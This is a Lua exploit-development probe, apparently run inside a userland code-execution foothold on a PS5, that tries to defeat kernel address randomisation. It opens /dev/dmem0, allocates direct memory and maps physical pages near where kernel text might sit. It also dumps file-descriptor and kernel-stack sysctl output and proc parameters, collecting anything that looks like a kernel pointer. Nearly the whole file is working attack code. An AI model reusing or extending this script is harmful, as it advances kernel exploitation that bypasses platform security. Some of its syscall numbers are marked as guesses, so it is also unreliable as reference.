-- CRASH_CLASS: RISKY (dmem0 mmap + ioctl for physical memory access)
-- PROBE 42d: KASLR defeat via /dev/dmem0 and filedesc sysctl
--
-- From 42c: /dev/dmem0 opens (fd=24). This is the direct memory
-- allocation device. We may be able to mmap physical memory
-- containing kernel data structures or text.
--
-- Also tries: kern.proc.filedesc sysctl (returns fd table with
-- kernel vnode pointers) and stack-region scanning.

print("=== PROBE 42d: DMEM KASLR ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_ioctl = make_syscall(54)
local sc_read = make_syscall(3)
local sc_fstat = make_syscall(189)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local kptrs = {}

--------------------------------------------------------------------
-- A) Open /dev/dmem0 and try to mmap physical memory
--------------------------------------------------------------------
print("")
print("=== A: DMEM0 PHYSICAL MEMORY ===")
do
    local path = memory.alloc(32)
    local s = "/dev/dmem0"
    for i = 1, #s do memory.write_byte(path+(i-1), string.byte(s, i)) end
    memory.write_byte(path + #s, 0)

    local ok_o, fd = pcall(function()
        return sc_open(uint64(path), uint64(2), uint64(0))  -- O_RDWR=2
    end)
    local dmem_fd = ok_o and to_num(fd) or -1
    print("dmem0 fd: " .. dmem_fd)

    if dmem_fd >= 0 then
        -- Try to query dmem via ioctl
        -- On PS5, dmem ioctl codes:
        --   DMEM_TOTAL = 0x4008800A (get total size)
        --   DMEM_AVAIL = 0x4008800B (get available)
        local ioctl_buf = memory.alloc(64)
        for i = 0, 56, 4 do safe_wd(ioctl_buf+i, 0) end

        -- Try DMEM_TOTAL
        local ok_i, iret = pcall(function()
            return sc_ioctl(uint64(dmem_fd), uint64(0x4008800A), uint64(ioctl_buf))
        end)
        local irv = ok_i and to_num(iret) or -999
        print(string.format("  ioctl DMEM_TOTAL: ret=%d", irv))
        if irv == 0 then
            local q = safe_rq(ioctl_buf)
            if q then
                local h, l = get_hi_lo(q)
                print(string.format("    total: %08X_%08X (%d MB)", h, l, l / 1048576))
            end
        end

        -- Try DMEM_AVAIL
        for i = 0, 56, 4 do safe_wd(ioctl_buf+i, 0) end
        ok_i, iret = pcall(function()
            return sc_ioctl(uint64(dmem_fd), uint64(0x4008800B), uint64(ioctl_buf))
        end)
        irv = ok_i and to_num(iret) or -999
        print(string.format("  ioctl DMEM_AVAIL: ret=%d", irv))
        if irv == 0 then
            local q = safe_rq(ioctl_buf)
            if q then
                local h, l = get_hi_lo(q)
                print(string.format("    avail: %08X_%08X (%d MB)", h, l, l / 1048576))
            end
        end

        -- Try to allocate direct memory
        -- sceKernelAllocateDirectMemory(searchStart, searchEnd, len, alignment, memoryType, &physAddrOut)
        -- This is syscall 572
        local sc_alloc_dm = make_syscall(572)
        local phys_out = memory.alloc(8)
        safe_wq(phys_out, uint64(0))

        local ok_a, aret = pcall(function()
            return sc_alloc_dm(
                uint64(0),              -- searchStart
                uint64(0x40000000),     -- searchEnd (1GB)
                uint64(0x4000),         -- len (1 page = 16KB)
                uint64(0x4000),         -- alignment
                uint64(0),              -- memoryType (WB_ONION)
                uint64(phys_out)        -- out physical addr
            )
        end)
        local arv = ok_a and to_num(aret) or -999
        print(string.format("  allocate_direct_memory: ret=%d", arv))
        if arv == 0 then
            local phys = safe_rq(phys_out)
            if phys then
                local ph, pl = get_hi_lo(phys)
                print(string.format("    physical addr: %08X_%08X", ph, pl))

                -- Now mmap this physical page to see if we can read it
                local ok_m, maddr = pcall(function()
                    return sc_mmap(
                        uint64(0),              -- addr hint
                        uint64(0x4000),         -- len
                        uint64(3),              -- PROT_READ|PROT_WRITE
                        uint64(0x10),           -- MAP_SHARED
                        uint64(dmem_fd),        -- fd
                        uint64(phys)            -- offset = physical addr
                    )
                end)
                local mrv = ok_m and maddr or nil
                if mrv then
                    local mh, ml = get_hi_lo(mrv)
                    print(string.format("    mmap at: %08X_%08X", mh, ml))
                    -- Read first qwords
                    for off = 0, 0x38, 8 do
                        local q = safe_rq(mrv + off)
                        if q then
                            local qh, ql = get_hi_lo(q)
                            if qh ~= 0 or ql ~= 0 then
                                print(string.format("      +%02X: %08X_%08X", off, qh, ql))
                            end
                        end
                    end
                    pcall(function() sc_munmap(mrv, uint64(0x4000)) end)
                else
                    print("    mmap failed")
                end

                -- Free the direct memory
                local sc_free_dm = make_syscall(573)
                pcall(function() sc_free_dm(uint64(phys), uint64(0x4000)) end)
            end
        end

        -- Try mmap at specific physical offsets where kernel might live
        -- On x86-64, kernel is typically loaded at physical 0x100000 (1MB) or higher
        -- Try mapping physical address 0 (first page) and 0x100000
        local phys_targets = {0x0, 0x1000, 0x100000, 0x200000, 0x1000000}
        for _, phys_off in ipairs(phys_targets) do
            local ok_m2, maddr2 = pcall(function()
                return sc_mmap(
                    uint64(0), uint64(0x4000), uint64(1),  -- PROT_READ
                    uint64(0x10),  -- MAP_SHARED
                    uint64(dmem_fd), uint64(phys_off)
                )
            end)
            local m2rv = ok_m2 and to_num(maddr2) or -1
            local tag = "fail"
            if m2rv > 0 and m2rv < 0xFFFFFFFF then
                tag = "OK"
                -- read first qword
                local q = safe_rq(maddr2)
                if q then
                    local qh, ql = get_hi_lo(q)
                    tag = string.format("OK val=%08X_%08X", qh, ql)
                    if qh >= 0xFFFF8000 then
                        kptrs[#kptrs+1] = {src="dmem_phys", off=phys_off, h=qh, l=ql}
                        tag = tag .. " KPTR!"
                    end
                end
                pcall(function() sc_munmap(maddr2, uint64(0x4000)) end)
            end
            print(string.format("  mmap phys 0x%X: %s", phys_off, tag))
        end

        pcall(function() sc_close(uint64(dmem_fd)) end)
    end
end

--------------------------------------------------------------------
-- B) kern.proc.filedesc — fd table with kernel vnode pointers
--------------------------------------------------------------------
print("")
print("=== B: FILEDESC SYSCTL ===")
do
    local mib = memory.alloc(16)
    safe_wd(mib, 1); safe_wd(mib+4, 14); safe_wd(mib+8, 14); safe_wd(mib+12, pid)
    local out = memory.alloc(0x2000)
    for i = 0, 0xFF, 4 do safe_wd(out+i, 0) end
    local lenp = memory.alloc(8)
    safe_wd(lenp, 0x2000)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(4), uint64(out), uint64(lenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    local alen = safe_rd(lenp) or 0
    print(string.format("  kern.proc.filedesc: ret=%d len=%d", rv, alen))

    if rv == 0 and alen > 0 then
        local found = 0
        for off = 0, math.min(alen-8, 0x1FF8), 8 do
            local q = safe_rq(out+off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 then
                    print(string.format("    +%03X: %08X_%08X KPTR!", off, h, l))
                    kptrs[#kptrs+1] = {src="filedesc", off=off, h=h, l=l}
                    found = found + 1
                    if found >= 10 then print("    ... (capped)"); break end
                end
            end
        end
        if found == 0 then
            -- show first few non-zero entries
            local shown = 0
            for off = 0, math.min(alen-8, 0x1FF8), 8 do
                local q = safe_rq(out+off)
                if q then
                    local h, l = get_hi_lo(q)
                    if (h ~= 0 or l ~= 0) and shown < 8 then
                        print(string.format("    +%03X: %08X_%08X", off, h, l))
                        shown = shown + 1
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- C) kern.proc.kstack — kernel stack with return addresses
--------------------------------------------------------------------
print("")
print("=== C: KSTACK SYSCTL ===")
do
    -- kern.proc.kstack = {1, 14, 38, pid} or {1, 14, 42, pid}
    local mibs = {
        {"kstack.38", {1, 14, 38, pid}},
        {"kstack.42", {1, 14, 42, pid}},
    }
    for _, m in ipairs(mibs) do
        local mib = memory.alloc(16)
        for i, v in ipairs(m[2]) do safe_wd(mib+(i-1)*4, v) end
        local out = memory.alloc(0x2000)
        for i = 0, 0xFF, 4 do safe_wd(out+i, 0) end
        local lenp = memory.alloc(8)
        safe_wd(lenp, 0x2000)
        local ok, ret = pcall(function()
            return sc_sysctl(uint64(mib), uint64(4), uint64(out), uint64(lenp), uint64(0), uint64(0))
        end)
        local rv = ok and to_num(ret) or -999
        local alen = safe_rd(lenp) or 0
        print(string.format("  %s: ret=%d len=%d", m[1], rv, alen))

        if rv == 0 and alen > 0 then
            for off = 0, math.min(alen-8, 0xFF8), 8 do
                local q = safe_rq(out+off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 then
                        print(string.format("    +%03X: %08X_%08X KPTR!", off, h, l))
                        kptrs[#kptrs+1] = {src=m[1], off=off, h=h, l=l}
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- D) Try reading the ELF auxv from stack
-- On FreeBSD, sceKernelGetProcParam (syscall 599) returns proc param
--------------------------------------------------------------------
print("")
print("=== D: PROC PARAM ===")
do
    local sc_pp = make_syscall(599)
    local ok_pp, pp_ret = pcall(function()
        return sc_pp()
    end)
    if ok_pp and pp_ret then
        local h, l = get_hi_lo(pp_ret)
        print(string.format("  sceKernelGetProcParam: %08X_%08X", h, l))
        if h > 0 or l > 0x10000 then
            -- read the proc param structure
            local pp_addr = uint64(pp_ret)
            for off = 0, 0x78, 8 do
                local q = safe_rq(pp_addr + off)
                if q then
                    local qh, ql = get_hi_lo(q)
                    if qh ~= 0 or ql ~= 0 then
                        local tag = ""
                        if qh >= 0xFFFF8000 then
                            tag = " KPTR!"
                            kptrs[#kptrs+1] = {src="procparam", off=off, h=qh, l=ql}
                        end
                        print(string.format("    +%02X: %08X_%08X%s", off, qh, ql, tag))
                    end
                end
            end
        end
    else
        print("  sceKernelGetProcParam: failed")
    end
end

--------------------------------------------------------------------
-- E) Try regmgr / notification syscalls that might leak info
--------------------------------------------------------------------
print("")
print("=== E: MISC SYSCALLS ===")
do
    -- sceKernelGetCompiledSdkVersion (syscall 614)
    local sc_sdk = make_syscall(614)
    local sdk_buf = memory.alloc(8)
    safe_wd(sdk_buf, 0)
    local ok_s, sret = pcall(function()
        return sc_sdk(uint64(sdk_buf))
    end)
    local srv = ok_s and to_num(sret) or -999
    local sdk_val = safe_rd(sdk_buf)
    print(string.format("  SDK version: ret=%d val=0x%X", srv, sdk_val or 0))

    -- sceKernelGetCpuFrequency (syscall 618)
    local sc_freq = make_syscall(618)
    local ok_f, fret = pcall(function()
        return sc_freq()
    end)
    if ok_f and fret then
        local fh, fl = get_hi_lo(fret)
        print(string.format("  CPU freq: %08X_%08X", fh, fl))
    else
        print("  CPU freq: failed")
    end

    -- sceKernelGetCpuTemperature (syscall 620 or similar)
    local sc_temp = make_syscall(620)
    local temp_buf = memory.alloc(8)
    local ok_t, tret = pcall(function()
        return sc_temp(uint64(temp_buf))
    end)
    local trv = ok_t and to_num(tret) or -999
    if trv == 0 then
        local tv = safe_rd(temp_buf)
        print(string.format("  CPU temp: %d", tv or 0))
    end
end

--------------------------------------------------------------------
-- SUMMARY
--------------------------------------------------------------------
print("")
print("=== SUMMARY ===")
print("kernel pointers found: " .. #kptrs)
for _, kp in ipairs(kptrs) do
    print(string.format("  [%s +%03X] %08X_%08X", kp.src, kp.off, kp.h, kp.l))
end

if #kptrs == 0 then
    print("  no kernel pointers — all sanitized on 14.10")
end

print("")
print("=== PROBE 42d COMPLETE ===")
